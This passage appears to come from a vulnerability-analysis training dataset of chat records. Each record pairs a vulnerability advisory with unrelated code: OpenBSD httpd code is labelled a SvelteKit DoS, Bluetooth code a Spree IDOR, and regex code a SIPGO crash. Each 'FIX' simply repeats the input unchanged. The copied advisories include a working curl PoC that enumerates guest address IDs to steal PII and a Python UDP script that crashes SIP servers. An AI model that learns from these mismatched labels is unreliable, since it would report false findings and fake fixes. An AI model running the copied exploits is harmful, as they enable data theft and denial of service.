*/\n\tsrv_conf = server_getlocation(clt, desc->http_path);\n\n\tif (srv_conf->flags & SRVFLAG_BLOCK) {\n\t\tserver_abort_http(clt, srv_conf->return_code,\n\t\t    srv_conf->return_uri);\n\t\treturn (-1);\n\t} else if (srv_conf->flags & SRVFLAG_AUTH &&\n\t    server_http_authenticate(srv_conf, clt) == -1) {\n\t\tserver_abort_http(clt, 401, srv_conf->auth_realm);\n\t\treturn (-1);\n\t} else\n\t\treturn (server_file(httpd, clt));\n fail:\n\tserver_abort_http(clt, 400, \"bad request\");\n\treturn (-1);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-770\nREASON: Under certain circumstances, serializing sparse arrays using `uneval` or `stringify` could cause CPU and/or memory exhaustion. When this occurs on the server, it results in a DoS. This is extremely difficult to take advantage of in practice, as an attacker would have to manage to create a sparse array on the server \u2014 which is impossible in every mainstream wire format \u2014 and then that sparse array would have to be run through `uneval` or `stringify`.\nFIX:\nserver_response(struct httpd *httpd, struct client *clt)\n{\n\tchar\t\t\t path[PATH_MAX];\n\tchar\t\t\t hostname[HOST_NAME_MAX+1];\n\tstruct http_descriptor\t*desc = clt->clt_descreq;\n\tstruct http_descriptor\t*resp = clt->clt_descresp;\n\tstruct server\t\t*srv = clt->clt_srv;\n\tstruct server_config\t*srv_conf = &srv->srv_conf;\n\tstruct kv\t\t*kv, key, *host;\n\tstruct str_find\t\t sm;\n\tint\t\t\t portval = -1, ret;\n\tchar\t\t\t*hostval;\n\tconst char\t\t*errstr = NULL;\n\n\t/* Canonicalize the request path */\n\tif (desc->http_path == NULL ||\n\t    url_decode(desc->http_path) == NULL ||\n\t    canonicalize_path(desc->http_path, path, sizeof(path)) == NULL)\n\t\tgoto fail;\n\tfree(desc->http_path);\n\tif ((desc->http_path = strdup(path)) == NULL)\n\t\tgoto fail;\n\n\tkey.kv_key = \"Host\";\n\tif ((host = kv_find(&desc->http_headers, &key)) != NULL &&\n\t    host->kv_value == NULL)\n\t\thost = NULL;\n\n\tif (strcmp(desc->http_version, \"HTTP/1.1\") == 0) {\n\t\t/* Host header is mandatory */\n\t\tif (host == NULL)\n\t\t\tgoto fail;\n\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"close\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist = 0;\n\t\telse\n\t\t\tclt->clt_persist++;\n\t} else {\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"keep-alive\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist++;\n\t\telse\n\t\t\tclt->clt_persist = 0;\n\t}\n\n\tif (clt->clt_persist >= srv_conf->maxrequests)\n\t\tclt->clt_persist = 0;\n\n\t/*\n\t * Do we have a Host header and matching configuration?\n\t * XXX the Host can also appear in the URL path.\n\t */\n\tif (host != NULL) {\n\t\tif ((hostval = server_http_parsehost(host->kv_value,\n\t\t    hostname, sizeof(hostname), &portval)) == NULL)\n\t\t\tgoto fail;\n\n\t\tTAILQ_FOREACH(srv_conf, &srv->srv_hosts, entry) {\n#ifdef DEBUG\n\t\t\tif ((srv_conf->flags & SRVFLAG_LOCATION) == 0) {\n\t\t\t\tDPRINTF(\"%s: virtual host \\\"%s:%u\\\"\"\n\t\t\t\t    \" host \\\"%s\\\" (\\\"%s\\\")\",\n\t\t\t\t    __func__, srv_conf->name,\n\t\t\t\t    ntohs(srv_conf->port), host->kv_value,\n\t\t\t\t    hostname);\n\t\t\t}\n#endif\n\t\t\tif (srv_conf->flags & SRVFLAG_LOCATION)\n\t\t\t\tcontinue;\n\t\t\telse if (srv_conf->flags & SRVFLAG_SERVER_MATCH) {\n\t\t\t\tstr_find(hostname, srv_conf->name,\n\t\t\t\t    &sm, 1, &errstr);\n\t\t\t\tret = errstr == NULL ? 0 : -1;\n\t\t\t} else {\n\t\t\t\tret = fnmatch(srv_conf->name,\n\t\t\t\t    hostname, FNM_CASEFOLD);\n\t\t\t}\n\t\t\tif (ret == 0 &&\n\t\t\t    (portval == -1 ||\n\t\t\t    (portval != -1 && portval == srv_conf->port))) {\n\t\t\t\t/* Replace host configuration */\n\t\t\t\tclt->clt_srv_conf = srv_conf;\n\t\t\t\tsrv_conf = NULL;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (srv_conf != NULL) {\n\t\t/* Use the actual server IP address */\n\t\tif (server_http_host(&clt->clt_srv_ss, hostname,\n\t\t    sizeof(hostname)) == NULL)\n\t\t\tgoto fail;\n\t} else {\n\t\t/* Host header was valid and found */\n\t\tif (strlcpy(hostname, host->kv_value, sizeof(hostname)) >=\n\t\t    sizeof(hostname))\n\t\t\tgoto fail;\n\t\tsrv_conf = clt->clt_srv_conf;\n\t}\n\n\tif ((desc->http_host = strdup(hostname)) == NULL)\n\t\tgoto fail;\n\n\t/* Now fill in the mandatory parts of the response descriptor */\n\tresp->http_method = desc->http_method;\n\tif ((resp->http_version = strdup(desc->http_version)) == NULL)\n\t\tgoto fail;\n\n\t/* Now search for the location */\n\tsrv_conf = server_getlocation(clt, desc->http_path);\n\n\tif (srv_conf->flags & SRVFLAG_BLOCK) {\n\t\tserver_abort_http(clt, srv_conf->return_code,\n\t\t    srv_conf->return_uri);\n\t\treturn (-1);\n\t} else if (srv_conf->flags & SRVFLAG_AUTH &&\n\t    server_http_authenticate(srv_conf, clt) == -1) {\n\t\tserver_abort_http(clt, 401, srv_conf->auth_realm);\n\t\treturn (-1);\n\t} else\n\t\treturn (server_file(httpd, clt));\n fail:\n\tserver_abort_http(clt, 400, \"bad request\");\n\treturn (-1);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for registry-support: decompress can delete files outside scope via relative paths:\n\nread_fatal (void)\n{\n  pfatal (\"read error\");\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: A vulnerability was found in the decompression function of registry-support. This issue can be triggered by an unauthenticated remote attacker when tricking a user into opening a specially modified .tar archive, leading to the cleanup process following relative paths to overwrite or delete files outside the intended scope.\nFIX:\nread_fatal (void)\n{\n  pfatal (\"read error\");\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for  Memory exhaustion in SvelteKit remote form deserialization (experimental only):\n\nserver_response(struct httpd *httpd, struct client *clt)\n{\n\tchar\t\t\t path[PATH_MAX];\n\tchar\t\t\t hostname[HOST_NAME_MAX+1];\n\tstruct http_descriptor\t*desc = clt->clt_descreq;\n\tstruct http_descriptor\t*resp = clt->clt_descresp;\n\tstruct server\t\t*srv = clt->clt_srv;\n\tstruct server_config\t*srv_conf = &srv->srv_conf;\n\tstruct kv\t\t*kv, key, *host;\n\tstruct str_find\t\t sm;\n\tint\t\t\t portval = -1, ret;\n\tchar\t\t\t*hostval;\n\tconst char\t\t*errstr = NULL;\n\n\t/* Canonicalize the request path */\n\tif (desc->http_path == NULL ||\n\t    url_decode(desc->http_path) == NULL ||\n\t    canonicalize_path(desc->http_path, path, sizeof(path)) == NULL)\n\t\tgoto fail;\n\tfree(desc->http_path);\n\tif ((desc->http_path = strdup(path)) == NULL)\n\t\tgoto fail;\n\n\tkey.kv_key = \"Host\";\n\tif ((host = kv_find(&desc->http_headers, &key)) != NULL &&\n\t    host->kv_value == NULL)\n\t\thost = NULL;\n\n\tif (strcmp(desc->http_version, \"HTTP/1.1\") == 0) {\n\t\t/* Host header is mandatory */\n\t\tif (host == NULL)\n\t\t\tgoto fail;\n\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"close\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist = 0;\n\t\telse\n\t\t\tclt->clt_persist++;\n\t} else {\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"keep-alive\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist++;\n\t\telse\n\t\t\tclt->clt_persist = 0;\n\t}\n\n\tif (clt->clt_persist >= srv_conf->maxrequests)\n\t\tclt->clt_persist = 0;\n\n\t/*\n\t * Do we have a Host header and matching configuration?\n\t * XXX the Host can also appear in the URL path.\n\t */\n\tif (host != NULL) {\n\t\tif ((hostval = server_http_parsehost(host->kv_value,\n\t\t    hostname, sizeof(hostname), &portval)) == NULL)\n\t\t\tgoto fail;\n\n\t\tTAILQ_FOREACH(srv_conf, &srv->srv_hosts, entry) {\n#ifdef DEBUG\n\t\t\tif ((srv_conf->flags & SRVFLAG_LOCATION) == 0) {\n\t\t\t\tDPRINTF(\"%s: virtual host \\\"%s:%u\\\"\"\n\t\t\t\t    \" host \\\"%s\\\" (\\\"%s\\\")\",\n\t\t\t\t    __func__, srv_conf->name,\n\t\t\t\t    ntohs(srv_conf->port), host->kv_value,\n\t\t\t\t    hostname);\n\t\t\t}\n#endif\n\t\t\tif (srv_conf->flags & SRVFLAG_LOCATION)\n\t\t\t\tcontinue;\n\t\t\telse if (srv_conf->flags & SRVFLAG_SERVER_MATCH) {\n\t\t\t\tstr_find(hostname, srv_conf->name,\n\t\t\t\t    &sm, 1, &errstr);\n\t\t\t\tret = errstr == NULL ? 0 : -1;\n\t\t\t} else {\n\t\t\t\tret = fnmatch(srv_conf->name,\n\t\t\t\t    hostname, FNM_CASEFOLD);\n\t\t\t}\n\t\t\tif (ret == 0 &&\n\t\t\t    (portval == -1 ||\n\t\t\t    (portval != -1 && portval == srv_conf->port))) {\n\t\t\t\t/* Replace host configuration */\n\t\t\t\tclt->clt_srv_conf = srv_conf;\n\t\t\t\tsrv_conf = NULL;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (srv_conf != NULL) {\n\t\t/* Use the actual server IP address */\n\t\tif (server_http_host(&clt->clt_srv_ss, hostname,\n\t\t    sizeof(hostname)) == NULL)\n\t\t\tgoto fail;\n\t} else {\n\t\t/* Host header was valid and found */\n\t\tif (strlcpy(hostname, host->kv_value, sizeof(hostname)) >=\n\t\t    sizeof(hostname))\n\t\t\tgoto fail;\n\t\tsrv_conf = clt->clt_srv_conf;\n\t}\n\n\tif ((desc->http_host = strdup(hostname)) == NULL)\n\t\tgoto fail;\n\n\t/* Now fill in the mandatory parts of the response descriptor */\n\tresp->http_method = desc->http_method;\n\tif ((resp->http_version = strdup(desc->http_version)) == NULL)\n\t\tgoto fail;\n\n\t/* Now search for the location */\n\tsrv_conf = server_getlocation(clt, desc->http_path);\n\n\tif (srv_conf->flags & SRVFLAG_BLOCK) {\n\t\tserver_abort_http(clt, srv_conf->return_code,\n\t\t    srv_conf->return_uri);\n\t\treturn (-1);\n\t} else if (srv_conf->flags & SRVFLAG_AUTH &&\n\t    server_http_authenticate(srv_conf, clt) == -1) {\n\t\tserver_abort_http(clt, 401, srv_conf->auth_realm);\n\t\treturn (-1);\n\t} else\n\t\treturn (server_file(httpd, clt));\n fail:\n\tserver_abort_http(clt, 400, \"bad request\");\n\treturn (-1);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-770\nREASON: Versions of `@sveltejs/kit` prior to 2.52.2 with remote functions enabled can be vulnerable to memory exhaustion. Malformed form data can cause the server process to crash due to excessive memory allocation, resulting in denial of service.\n\nOnly applications using both `experimental.remoteFunctions` and `form` are vulnerable.\nFIX:\nserver_response(struct httpd *httpd, struct client *clt)\n{\n\tchar\t\t\t path[PATH_MAX];\n\tchar\t\t\t hostname[HOST_NAME_MAX+1];\n\tstruct http_descriptor\t*desc = clt->clt_descreq;\n\tstruct http_descriptor\t*resp = clt->clt_descresp;\n\tstruct server\t\t*srv = clt->clt_srv;\n\tstruct server_config\t*srv_conf = &srv->srv_conf;\n\tstruct kv\t\t*kv, key, *host;\n\tstruct str_find\t\t sm;\n\tint\t\t\t portval = -1, ret;\n\tchar\t\t\t*hostval;\n\tconst char\t\t*errstr = NULL;\n\n\t/* Canonicalize the request path */\n\tif (desc->http_path == NULL ||\n\t    url_decode(desc->http_path) == NULL ||\n\t    canonicalize_path(desc->http_path, path, sizeof(path)) == NULL)\n\t\tgoto fail;\n\tfree(desc->http_path);\n\tif ((desc->http_path = strdup(path)) == NULL)\n\t\tgoto fail;\n\n\tkey.kv_key = \"Host\";\n\tif ((host = kv_find(&desc->http_headers, &key)) != NULL &&\n\t    host->kv_value == NULL)\n\t\thost = NULL;\n\n\tif (strcmp(desc->http_version, \"HTTP/1.1\") == 0) {\n\t\t/* Host header is mandatory */\n\t\tif (host == NULL)\n\t\t\tgoto fail;\n\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"close\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist = 0;\n\t\telse\n\t\t\tclt->clt_persist++;\n\t} else {\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"keep-alive\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist++;\n\t\telse\n\t\t\tclt->clt_persist = 0;\n\t}\n\n\tif (clt->clt_persist >= srv_conf->maxrequests)\n\t\tclt->clt_persist = 0;\n\n\t/*\n\t * Do we have a Host header and matching configuration?\n\t * XXX the Host can also appear in the URL path.\n\t */\n\tif (host != NULL) {\n\t\tif ((hostval = server_http_parsehost(host->kv_value,\n\t\t    hostname, sizeof(hostname), &portval)) == NULL)\n\t\t\tgoto fail;\n\n\t\tTAILQ_FOREACH(srv_conf, &srv->srv_hosts, entry) {\n#ifdef DEBUG\n\t\t\tif ((srv_conf->flags & SRVFLAG_LOCATION) == 0) {\n\t\t\t\tDPRINTF(\"%s: virtual host \\\"%s:%u\\\"\"\n\t\t\t\t    \" host \\\"%s\\\" (\\\"%s\\\")\",\n\t\t\t\t    __func__, srv_conf->name,\n\t\t\t\t    ntohs(srv_conf->port), host->kv_value,\n\t\t\t\t    hostname);\n\t\t\t}\n#endif\n\t\t\tif (srv_conf->flags & SRVFLAG_LOCATION)\n\t\t\t\tcontinue;\n\t\t\telse if (srv_conf->flags & SRVFLAG_SERVER_MATCH) {\n\t\t\t\tstr_find(hostname, srv_conf->name,\n\t\t\t\t    &sm, 1, &errstr);\n\t\t\t\tret = errstr == NULL ? 0 : -1;\n\t\t\t} else {\n\t\t\t\tret = fnmatch(srv_conf->name,\n\t\t\t\t    hostname, FNM_CASEFOLD);\n\t\t\t}\n\t\t\tif (ret == 0 &&\n\t\t\t    (portval == -1 ||\n\t\t\t    (portval != -1 && portval == srv_conf->port))) {\n\t\t\t\t/* Replace host configuration */\n\t\t\t\tclt->clt_srv_conf = srv_conf;\n\t\t\t\tsrv_conf = NULL;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (srv_conf != NULL) {\n\t\t/* Use the actual server IP address */\n\t\tif (server_http_host(&clt->clt_srv_ss, hostname,\n\t\t    sizeof(hostname)) == NULL)\n\t\t\tgoto fail;\n\t} else {\n\t\t/* Host header was valid and found */\n\t\tif (strlcpy(hostname, host->kv_value, sizeof(hostname)) >=\n\t\t    sizeof(hostname))\n\t\t\tgoto fail;\n\t\tsrv_conf = clt->clt_srv_conf;\n\t}\n\n\tif ((desc->http_host = strdup(hostname)) == NULL)\n\t\tgoto fail;\n\n\t/* Now fill in the mandatory parts of the response descriptor */\n\tresp->http_method = desc->http_method;\n\tif ((resp->http_version = strdup(desc->http_version)) == NULL)\n\t\tgoto fail;\n\n\t/* Now search for the location */\n\tsrv_conf = server_getlocation(clt, desc->http_path);\n\n\tif (srv_conf->flags & SRVFLAG_BLOCK) {\n\t\tserver_abort_http(clt, srv_conf->return_code,\n\t\t    srv_conf->return_uri);\n\t\treturn (-1);\n\t} else if (srv_conf->flags & SRVFLAG_AUTH &&\n\t    server_http_authenticate(srv_conf, clt) == -1) {\n\t\tserver_abort_http(clt, 401, srv_conf->auth_realm);\n\t\treturn (-1);\n\t} else\n\t\treturn (server_file(httpd, clt));\n fail:\n\tserver_abort_http(clt, 400, \"bad request\");\n\treturn (-1);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Unauthenticated Spree Commerce users can access all guest addresses:\n\nstatic void on_l2cap_outgoing_congest(tBTA_JV_L2CAP_CONG *p, uint32_t id)\n{\n    l2cap_socket *sock;\n\n    pthread_mutex_lock(&state_lock);\n    sock = btsock_l2cap_find_by_id_l(id);\n if (sock) {\n        sock->outgoing_congest = p->cong ? 1 : 0;\n if (!sock->outgoing_congest) {\n            APPL_TRACE_DEBUG(\"on_l2cap_outgoing_congest: adding fd to btsock_thread...\");\n            btsock_thread_add_fd(pth, sock->our_fd, BTSOCK_L2CAP, SOCK_THREAD_FD_RD, sock->id);\n\n }\n }\n    pthread_mutex_unlock(&state_lock);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-284\nREASON: ### Summary\nA critical IDOR vulnerability exists in Spree Commerce's guest checkout flow that allows any guest user to bind arbitrary guest addresses to their order by manipulating address ID parameters. This enables unauthorized access to other guests' personally identifiable information (PII) including names, addresses and phone numbers. The vulnerability bypasses existing ownership validation checks and affects all guest checkout transactions.\n\n### Impact\nThis issue may lead to disclosure of PII of guest users (including names, addresses and phone numbers).\n\n### Unauthenticated users can access all guest addresses (`GHSL-2026-027`)\n\nThe vulnerability stems from incomplete authorization validation in Spree's checkout address assignment logic. While nested address attributes (`bill_address_attributes[id]` and `ship_address_attributes[id]`) are properly validated through `validate_address_ownership`, plain ID parameters (`bill_address_id` and `ship_address_id`) bypass this check entirely. Since Spree's address IDs are sequential numbers, an attacker might get all guest addresses by simply enumerating over them.\n\n### Affected Code Components\n\n1. **Permitted Attributes** ([`core/lib/spree/permitted_attributes.rb:92\u201396`](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/lib/spree/permitted_attributes.rb#L92-L96))\n   - Allows `bill_address_id` and `ship_address_id` as permitted parameters without validation\n\n2. **Checkout Update** ([`core/app/models/spree/order/checkout.rb:241\u2013254`](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/app/models/spree/order/checkout.rb#L241-L254))\n   - Applies permitted parameters directly to the Order model via `update_from_params`\n\n3. **Incomplete Ownership Validation** ([`core/app/services/spree/checkout/update.rb:33\u201348`](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/app/services/spree/checkout/update.rb#L33-L48))\n   - `validate_address_ownership` only validates nested attributes structure\n   - Does NOT validate plain `bill_address_id`/`ship_address_id` fields\n\n4. **Vulnerable Assignment Logic** ([`core/app/models/spree/order/address_book.rb:16\u201323, 31\u201338`](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/app/models/spree/order/address_book.rb#L16-L38))\n   * [`bill_address_id=` setter](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/app/models/spree/order/address_book.rb#L16-L24)\n   * [`ship_address_id=` setter](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/app/models/spree/order/address_book.rb#L31-L39)\n\nBoth setters check that: `address.user_id == order.user_id`. For guest orders: nil == nil \u2192 TRUE \u2713 (bypass!)\n\n#### Proof of Concept\n\nPrecondition: One guest address has to exist in Spree's database. (E.g. Create an order with a guest account and note the ID from the `spree_addresses` table. E.g. `3`)\n\nAs a guest user:\n1. Put one product in the cart and go to checkout.\n2. Fill in some address/phone number and continue.\n3. Modify this script containing a curl request with current values.\n\n```bash\n#!/bin/bash\n\nATTACKER_ORDER_TOKEN=\"\" # Taken from the URL\nVICTIM_ADDRESS_ID=\"3\" # As noted from the database\nCSRF_TOKEN=\"\" # From page source; `content` value from meta param `csrf-token`.\nSESSION_COOKIE=\"token=...; _my_store_session=...\" # from the browsers cookie store.\n\ncurl -i -X POST \\\n  -H \"x-csrf-token: ${CSRF_TOKEN}\" \\\n  -H \"Content-Type: application/x-www-form-urlencoded;charset=UTF-8\" \\\n  -b \"${SESSION_COOKIE}\" \\\n  --data-urlencode \"_method=patch\" \\\n  --data-urlencode \"authenticity_token=${CSRF_TOKEN}\" \\\n  --data-urlencode \"order[ship_address_id]=${VICTIM_ADDRESS_ID}\" \\\n  \"http://localhost:3000/checkout/${ATTACKER_ORDER_TOKEN}/update/address\"\n```\n\nExpected Result: Attacker's order now references victim's address. Through that the attacker has all address details in full display.\nThis can be verified by accessing  `/checkout/${ATTACKER_ORDER_TOKEN}/delivery` in the same browser where you created the new guest cart.\n\n#### Impact\n\nThis issue may lead to disclosure of PII of guest users (including names, addresses and phone numbers).\n\n#### CWEs\n\n- CWE-639: Authorization Bypass Through User-Controlled Key\n- CWE-284: Improper Access Control\n\n### Credit\n\nThis issue was discovered with the [GitHub Security Lab Taskflow Agent](https://github.com/GitHubSecurityLab/seclab-taskflow-agent) and manually verified by GHSL team members [@p- (Peter St\u00f6ckli)](https://github.com/p-) and [@m-y-mo (Man Yue Mo)](https://github.com/m-y-mo).\n\n### Disclosure Policy\n\nThis report is subject to a 90-day disclosure deadline, as described in more detail in our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy).\nFIX:\nstatic void on_l2cap_outgoing_congest(tBTA_JV_L2CAP_CONG *p, uint32_t id)\n{\n    l2cap_socket *sock;\n\n    pthread_mutex_lock(&state_lock);\n    sock = btsock_l2cap_find_by_id_l(id);\n if (sock) {\n        sock->outgoing_congest = p->cong ? 1 : 0;\n if (!sock->outgoing_congest) {\n            APPL_TRACE_DEBUG(\"on_l2cap_outgoing_congest: adding fd to btsock_thread...\");\n            btsock_thread_add_fd(pth, sock->our_fd, BTSOCK_L2CAP, SOCK_THREAD_FD_RD, sock->id);\n\n }\n }\n    pthread_mutex_unlock(&state_lock);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for SIPGO is Vulnerable to Response DoS via Nil Pointer Dereference:\n\ntree_min_len(Node* node, ScanEnv* env)\n{\n  OnigLen len;\n  OnigLen tmin;\n\n  len = 0;\n  switch (NODE_TYPE(node)) {\n  case NODE_BACKREF:\n    if (! NODE_IS_CHECKER(node)) {\n      int i;\n      int* backs;\n      MemEnv* mem_env = SCANENV_MEMENV(env);\n      BackRefNode* br = BACKREF_(node);\n      if (NODE_IS_RECURSION(node)) break;\n\n      backs = BACKREFS_P(br);\n      len = tree_min_len(mem_env[backs[0]].node, env);\n      for (i = 1; i < br->back_num; i++) {\n        tmin = tree_min_len(mem_env[backs[i]].node, env);\n        if (len > tmin) len = tmin;\n      }\n    }\n    break;\n\n#ifdef USE_CALL\n  case NODE_CALL:\n    {\n      Node* t = NODE_BODY(node);\n      if (NODE_IS_RECURSION(node)) {\n        if (NODE_IS_MIN_FIXED(t))\n          len = BAG_(t)->min_len;\n      }\n      else\n        len = tree_min_len(t, env);\n    }\n    break;\n#endif\n\n  case NODE_LIST:\n    do {\n      tmin = tree_min_len(NODE_CAR(node), env);\n      len = distance_add(len, tmin);\n    } while (IS_NOT_NULL(node = NODE_CDR(node)));\n    break;\n\n  case NODE_ALT:\n    {\n      Node *x, *y;\n      y = node;\n      do {\n        x = NODE_CAR(y);\n        tmin = tree_min_len(x, env);\n        if (y == node) len = tmin;\n        else if (len > tmin) len = tmin;\n      } while (IS_NOT_NULL(y = NODE_CDR(y)));\n    }\n    break;\n\n  case NODE_STRING:\n    {\n      StrNode* sn = STR_(node);\n      len = (int )(sn->end - sn->s);\n    }\n    break;\n\n  case NODE_CTYPE:\n  case NODE_CCLASS:\n    len = ONIGENC_MBC_MINLEN(env->enc);\n    break;\n\n  case NODE_QUANT:\n    {\n      QuantNode* qn = QUANT_(node);\n\n      if (qn->lower > 0) {\n        len = tree_min_len(NODE_BODY(node), env);\n        len = distance_multiply(len, qn->lower);\n      }\n    }\n    break;\n\n  case NODE_BAG:\n    {\n      BagNode* en = BAG_(node);\n      switch (en->type) {\n      case BAG_MEMORY:\n        if (NODE_IS_MIN_FIXED(node))\n          len = en->min_len;\n        else {\n          if (NODE_IS_MARK1(node))\n            len = 0;  /* recursive */\n          else {\n            NODE_STATUS_ADD(node, MARK1);\n            len = tree_min_len(NODE_BODY(node), env);\n            NODE_STATUS_REMOVE(node, MARK1);\n\n            en->min_len = len;\n            NODE_STATUS_ADD(node, MIN_FIXED);\n          }\n        }\n        break;\n\n      case BAG_OPTION:\n      case BAG_STOP_BACKTRACK:\n        len = tree_min_len(NODE_BODY(node), env);\n        break;\n      case BAG_IF_ELSE:\n        {\n          OnigLen elen;\n\n          len = tree_min_len(NODE_BODY(node), env);\n          if (IS_NOT_NULL(en->te.Then))\n            len += tree_min_len(en->te.Then, env);\n          if (IS_NOT_NULL(en->te.Else))\n            elen = tree_min_len(en->te.Else, env);\n          else elen = 0;\n\n          if (elen < len) len = elen;\n        }\n        break;\n      }\n    }\n    break;\n\n  case NODE_GIMMICK:\n    {\n      GimmickNode* g = GIMMICK_(node);\n      if (g->type == GIMMICK_FAIL) {\n        len = INFINITE_LEN;\n        break;\n      }\n    }\n    /* fall */\n  case NODE_ANCHOR:\n  default:\n    break;\n  }\n\n  return len;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-476\nREASON: ### Description\n\nA nil pointer dereference vulnerability was discovered in the SIPGO library's `NewResponseFromRequest` function that affects all normal SIP operations. The vulnerability allows remote attackers to crash any SIP application by sending a single malformed SIP request without a To header.\n\nThe vulnerability occurs when SIP message parsing succeeds for a request missing the To header, but the response creation code assumes the To header exists without proper nil checks. This affects routine operations like call setup, authentication, and message handling - not just error cases.\n\n> Note: This vulnerability affects all SIP applications using the sipgo library, not just specific configurations or edge cases, as long as they make use of the `NewResponseFromRequest` function.\n\n### Technical details\n\nThe vulnerability is located in `/sip/response.go` at line 242 in the `NewResponseFromRequest` function:\n\n```go\nif _, ok := res.To().Params[\"tag\"]; !ok {\n    uuid, _ := uuid.NewRandom()\n    res.to.Params[\"tag\"] = uuid.String()\n}\n```\n\n**Root Cause:**\n\n1. **Missing To Header**: When any SIP request is sent without a To header, the SIP message parsing succeeds but the To header is never set in the request object.\n\n2. **Header Copying Logic**: During response creation in `NewResponseFromRequest`, the code attempts to copy headers from the request to the response. Since there's no To header in the request, no To header is copied to the response.\n\n3. **Unsafe Assumption**: The response creation code assumes the To header exists and calls `res.To().Params[\"tag\"]` without checking if `res.To()` returns `nil`, causing a nil pointer dereference.\n\n**Stack Trace:**\n```\npanic: runtime error: invalid memory address or nil pointer dereference\n[signal SIGSEGV: segmentation violation code=0x2 addr=0x70 pc=0x10261fcb4]\n\ngoroutine 175 [running]:\ngithub.com/emiago/sipgo/sip.NewResponseFromRequest(0x14000433e00, 0x191, {0x1026b074b, 0xb}, {0x0, 0x0, 0x0})\n    /Users/user/Documents/GitHub/sipgo/sip/response.go:242 +0x394\n```\n\n### Impact\n\nThis vulnerability affects **all SIP applications using the sipgo library when using NewResponseFromRequest to generate SIP responses**.\n\n**Attack Impact:**\n- **Availability**: Complete denial of service - application crashes immediately\n- **Remote Exploitation**: Yes\n- **Authentication Required**: No - vulnerability triggers during initial response generation which does not require authentication\n\n\n### How to reproduce the issue\n\nTo reproduce this issue, you need:\n\n1. A SIP application using the vulnerable sipgo library\n2. Network access to send SIP messages to the target\n\nSteps:\n\n1. Save the following Python script as `sipgo-response-dos.py`:\n\n    ```python\n    #!/usr/bin/env python3\n    import socket\n    import sys\n    import time\n    import random\n\n    def create_malformed_register(target_ip, target_port):\n        call_id = f\"sipgo-dos-{int(time.time())}\"\n        tag = f\"sipgo-dos-{random.randint(1000, 9999)}\"\n        branch = f\"z9hG4bK-sipgo-dos-{random.randint(10000, 99999)}\"\n        \n        # Craft malformed SIP request without To header\n        sip_message = (\n            f\"REGISTER sip:{target_ip}:{target_port} SIP/2.0\\r\\n\"\n            f\"Via: SIP/2.0/UDP 192.168.1.100:5060;rport;branch={branch}\\r\\n\"\n            f\"From: <sip:attacker@192.168.1.100>;tag={tag}\\r\\n\"\n            f\"Call-ID: {call_id}\\r\\n\"\n            f\"CSeq: 1 REGISTER\\r\\n\"\n            f\"Contact: <sip:attacker@192.168.1.100:5060>\\r\\n\"\n            f\"Content-Length: 0\\r\\n\"\n            f\"\\r\\n\"\n        )\n        return sip_message\n\n    if __name__ == \"__main__\":\n        if len(sys.argv) != 3:\n            print(\"Usage: python3 sipgo-response-dos.py <target_ip> <target_port>\")\n            sys.exit(1)\n        \n        target_ip = sys.argv[1]\n        target_port = int(sys.argv[2])\n        \n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        payload = create_malformed_register(target_ip, target_port)\n        \n        print(f\"Sending malformed REGISTER to {target_ip}:{target_port}\")\n        sock.sendto(payload.encode('utf-8'), (target_ip, target_port))\n        print(\"Exploit sent - target should crash immediately\")\n    ```\n\n\n2. Run the script against a vulnerable sipgo application:\n\n    ```bash\n    python3 sipgo-response-dos.py <target_ip> <target_port>\n    ```\n\n3. Observe that the target application crashes with a SIGSEGV panic.\n\n> Note: The key element is the missing To header in any SIP request, which triggers the nil pointer dereference.\nFIX:\ntree_min_len(Node* node, ScanEnv* env)\n{\n  OnigLen len;\n 